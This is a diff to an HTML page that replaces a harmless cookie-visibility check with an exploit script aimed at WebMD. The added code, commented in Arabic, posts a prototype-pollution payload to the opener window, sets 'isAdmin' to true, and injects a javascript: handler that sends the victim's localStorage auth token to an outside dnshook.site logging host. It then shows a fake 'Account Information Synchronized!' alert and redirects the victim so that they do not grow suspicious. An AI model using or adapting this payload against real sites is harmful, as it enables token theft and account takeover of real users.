@@ -5,12 +5,24 @@
 <pre id="out"></pre>
 
 <script>
-document.getElementById("out").innerText = JSON.stringify({
-  location: location.href,
-  referrer: document.referrer,
-  cookie_visible_from_attacker_origin: document.cookie || "[empty by browser design]",
-  note: "WebMD cookies are not accessible cross-domain (Same-Origin Policy)"
-}, null, 2);
+    // الوصول إلى النافذة التي قامت بالتوجيه (التي لا تزال على WebMD)
+    if (window.opener) {
+        // إرسال السم للنافذة الأصلية
+        window.opener.postMessage({
+            type: "set-config",
+            data: {
+                "__proto__": {
+                    // حقن كود لسرقة التوكنات فوراً
+                    "tokenHandler": "javascript:fetch('اhttps://webmd.comز6400a8d9-6bff-4da3-9540-9ebf5bdcdfa0.dnshook.site/log?token='+localStorage.getItem('auth'))",
+                    "isAdmin": true
+                }
+            }
+        }, "*");
+        
+        alert("Account Information Synchronized!");
+        // إعادة توجيه الضحية مرة أخرى للموقع الأصلي لعدم إثارة الشكوك
+        window.location.href = "https://member.webmd.com/profile";
+    }
 </script>
 </body>
 </html>
